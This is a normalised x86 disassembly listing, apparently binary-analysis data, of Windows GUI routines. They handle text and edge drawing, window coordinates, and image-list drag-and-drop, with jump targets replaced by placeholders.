push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44ad1c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call [ rw-data ]
sub_447c6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447c94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416a60
mov eax esi
call sub_441f04
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ esi + 0x208 ]
call sub_4229f0
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_447cf0
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416a60
call sub_432b54
call sub_432c34
test al al
jne r-xdata
call sub_432b54
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_432fbc
push esp
push 0x1
push 0xf
push 0x0
call sub_432b54
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_432cf4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_447d5c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_444408
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_447d80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447dd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447e98
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428f78
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428f78
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_447ea4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44cdac
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_447f04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44da20
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_447f30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44cbd8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_447dd8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_447f90
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_447ea4
push 0x0
call ShowCursor
sub_447f90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44cbd8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_447ff4
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_447d80
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_447ff4
push ebx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_448018
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_447d80
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44808c
push ebx
push esi
mov esi eax
mov eax esi
call sub_44cbd8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_447ff4
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_447eec
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4480d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4420f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43e78c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_448130
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44221c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_448180
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_422644
xor eax eax
push ebp
push sub_44821e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_422a70
xor eax eax
push ebp
push sub_4481fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43e7a4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448202
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_422a70
retn
sub_448230
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4482c4
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44824c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4482c4
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_4488bc
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_4482c4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4482f8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_448388
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov edx 0x2
call sub_448388
jmp r-xdata
retn
sub_448340
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4483f4
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov edx 0x2
call sub_4483f4
jmp r-xdata
retn
sub_448388
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_4487bc
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4483f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_4482a8
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_4487bc
push eax
mov eax esi
call sub_4482f8
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_4487bc
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_4484a4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4482a8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_4488bc
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4483f4
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4482a8
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4483f4
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4482f8
mov edx eax
add edx esi
mov eax ebx
call sub_4487e4
mov edx edi
mov eax ebx
call sub_4487e4
jmp r-xdata
mov eax ebx
call sub_448644
mov eax ebx
call sub_448894
mov ebx eax
test ebx ebx
jne r-xdata
sub_44854c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f40
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f94
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_448590
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403368
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_448601
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4408e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_448614
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_448894
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_448644
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4483f4
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4483f4
mov esi eax
push ebp
call sub_448614
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448894
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448388
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_448388
mov ecx ebx
pop edx
call sub_416a88
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f570
mov eax [ ebp - 0x4 ]
call sub_4487bc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_4487bc
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4487bc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_4487bc
push ebx
mov ebx eax
mov eax ebx
call sub_4482c4
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44824c
test al al
je r-xdata
mov eax ebx
call sub_4482f8
pop ebx
retn
sub_4487f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4487e4
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448294
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4487e8
mov edx esi
call sub_4487f8
sub_448834
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4487bc
mov edi eax
mov eax ebx
call sub_4482f8
cmp edi eax
jl r-xdata
mov eax esi
call sub_4484a4
mov eax [ esi + 0x1c ]
push eax
push sub_44a344
mov edx esi
call sub_448b70
mov eax ebx
call sub_4487bc
mov edi eax
mov eax esi
call sub_448340
cmp edi eax
jle r-xdata
mov eax ebx
call sub_448834
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4488a0
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4482c4
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_4488c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40313c
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403490
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422050
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_428a38
mov edx eax
mov eax ebx
call sub_4221cc
mov eax [ ebp - 0x4 ]
call sub_448a98
xor eax eax
push ebp
push sub_4489d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4484a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489db
mov eax [ ebp - 0x4 ]
call sub_448a9c
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4430c0
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4489db
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44a86c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_448a30
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_449a9c
mov eax [ esi + 0x10 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_448ab0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_448ab0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_448ab0
pop ecx
sub_448b08
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_448ab0
pop ecx
sub_448b34
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_448b34
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_448b34
pop ecx
sub_448b88
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_448b08
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4483f4
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4483f4
push eax
mov edx 0x1
mov eax ebx
call sub_448388
push eax
mov edx 0x2
mov eax ebx
call sub_448388
pop edx
pop ecx
call sub_416a88
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b80
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_448c0c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_448644
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416a88
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f570
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448270
